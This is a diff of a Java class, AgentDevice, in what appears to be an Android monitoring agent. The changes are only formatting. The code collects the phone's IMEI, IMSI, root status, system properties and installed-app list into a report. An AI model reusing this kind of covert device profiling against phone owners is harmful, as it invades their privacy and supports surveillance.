@@ -59,7 +59,9 @@ public class AgentDevice extends AgentBase {
 	 * Instantiates a new device agent.
 	 */
 	public AgentDevice() {
-		if(Cfg.DEBUG) Check.log( TAG + " DeviceAgent constructor");
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " DeviceAgent constructor");
+		}
 	}
 
 	/*
@@ -94,41 +96,44 @@ public class AgentDevice extends AgentBase {
 	public void go() {
 
 		// OS Version etc...
-		if(Cfg.DEBUG) Check.log( TAG + " Android");
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " Android");
+		}
 
 		final Runtime runtime = Runtime.getRuntime();
 		final Properties properties = System.getProperties();
 		readCpuUsage();
 
 		final StringBuffer sb = new StringBuffer();
-		if(Cfg.DEBUG){
+		if (Cfg.DEBUG) {
 			sb.append("Debug\n");
-			String timestamp = System.getProperty("build.timestamp");
-			if(timestamp!=null){
+			final String timestamp = System.getProperty("build.timestamp");
+			if (timestamp != null) {
 				sb.append(timestamp + "\n");
 			}
 		}
 		sb.append("-- SYSTEM --\r\n");
 		sb.append("IMEI: " + Device.self().getImei() + "\n");
-		
-		if (Device.self().getImei().length() == 0)
+
+		if (Device.self().getImei().length() == 0) {
 			sb.append("IMSI: SIM not present\n");
-		else
+		} else {
 			sb.append("IMSI: " + Device.self().getImsi() + "\n");
-		
+		}
+
 		sb.append("cpuUsage: " + cpuUsage + "\n");
 		sb.append("cpuTotal: " + cpuTotal + "\n");
 		sb.append("cpuIdle: " + cpuIdle + "\n");
-		
-		if(Status.self().haveRoot()){
+
+		if (Status.self().haveRoot()) {
 			sb.append("root: yes\n");
-		}else{
+		} else {
 			sb.append("root: no\n");
 		}
 
 		sb.append("-- PROPERTIES --\r\n");
 		final Iterator<Entry<Object, Object>> it = properties.entrySet().iterator();
-		
+
 		while (it.hasNext()) {
 			final Entry<Object, Object> pairs = it.next();
 			sb.append(pairs.getKey() + " : " + pairs.getValue() + "\n");
@@ -136,10 +141,12 @@ public class AgentDevice extends AgentBase {
 
 		if (processList == 1) {
 			final ArrayList<PInfo> apps = getInstalledApps(false); /*
-																	 * false = no system packages
+																	 * false =
+																	 * no system
+																	 * packages
 																	 */
 			final int max = apps.size();
-			
+
 			for (int i = 0; i < max; i++) {
 				sb.append(apps.get(i) + "\n");
 
@@ -171,24 +178,23 @@ public class AgentDevice extends AgentBase {
 	 */
 	private void readCpuUsage() {
 		try {
-			final BufferedReader reader = new BufferedReader(
-					new InputStreamReader(new FileInputStream("/proc/stat")),
+			final BufferedReader reader = new BufferedReader(new InputStreamReader(new FileInputStream("/proc/stat")),
 					1000);
 			final String load = reader.readLine();
 			reader.close();
 
 			final String[] toks = load.split(" ");
 
-			final long currTotal = Long.parseLong(toks[2])
-					+ Long.parseLong(toks[3]) + Long.parseLong(toks[4]);
+			final long currTotal = Long.parseLong(toks[2]) + Long.parseLong(toks[3]) + Long.parseLong(toks[4]);
 			final long currIdle = Long.parseLong(toks[5]);
 
-			this.cpuUsage = ((currTotal - cpuTotal) * 100.0f / (currTotal
-					- cpuTotal + currIdle - cpuIdle));
+			this.cpuUsage = ((currTotal - cpuTotal) * 100.0f / (currTotal - cpuTotal + currIdle - cpuIdle));
 			this.cpuTotal = currTotal;
 			this.cpuIdle = currIdle;
 		} catch (final IOException ex) {
-			if(Cfg.DEBUG) { Check.log(ex); }
+			if (Cfg.DEBUG) {
+				Check.log(ex);
+			}
 		}
 	}
 
@@ -206,36 +212,37 @@ public class AgentDevice extends AgentBase {
 	 * The Class PInfo.
 	 */
 	class PInfo {
-		
+
 		/** The appname. */
 		private String appname = "";
-		
+
 		/** The pname. */
 		private String pname = "";
-		
+
 		/** The version name. */
 		private String versionName = "";
-		
+
 		/** The version code. */
 		private int versionCode = 0;
-		
+
 		/** The icon. */
 		private Drawable icon;
 
-		/* (non-Javadoc)
+		/*
+		 * (non-Javadoc)
+		 * 
 		 * @see java.lang.Object#toString()
 		 */
 		@Override
 		public String toString() {
-			return appname + "\t" + pname + "\t" + versionName + "\t"
-					+ versionCode;
+			return appname + "\t" + pname + "\t" + versionName + "\t" + versionCode;
 		}
 
 	}
 
 	/**
 	 * Gets the packages.
-	 *
+	 * 
 	 * @return the packages
 	 */
 	private ArrayList<PInfo> getPackages() {
@@ -246,21 +253,23 @@ public class AgentDevice extends AgentBase {
 																 */
 		final int max = apps.size();
 		for (int i = 0; i < max; i++) {
-			if(Cfg.DEBUG) Check.log( TAG + " Info: " + apps.get(i).toString());
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " Info: " + apps.get(i).toString());
+			}
 		}
 		return apps;
 	}
 
 	/**
 	 * Gets the installed apps.
-	 *
-	 * @param getSysPackages the get sys packages
+	 * 
+	 * @param getSysPackages
+	 *            the get sys packages
 	 * @return the installed apps
 	 */
 	private ArrayList<PInfo> getInstalledApps(final boolean getSysPackages) {
 		final ArrayList<PInfo> res = new ArrayList<PInfo>();
-		final PackageManager packageManager = Status.getAppContext()
-				.getPackageManager();
+		final PackageManager packageManager = Status.getAppContext().getPackageManager();
 
 		final List<PackageInfo> packs = packageManager.getInstalledPackages(0);
 		for (int i = 0; i < packs.size(); i++) {
@@ -269,8 +278,7 @@ public class AgentDevice extends AgentBase {
 				continue;
 			}
 			final PInfo newInfo = new PInfo();
-			newInfo.appname = p.applicationInfo.loadLabel(packageManager)
-					.toString();
+			newInfo.appname = p.applicationInfo.loadLabel(packageManager).toString();
 			newInfo.pname = p.packageName;
 			newInfo.versionName = p.versionName;
 			newInfo.versionCode = p.versionCode;
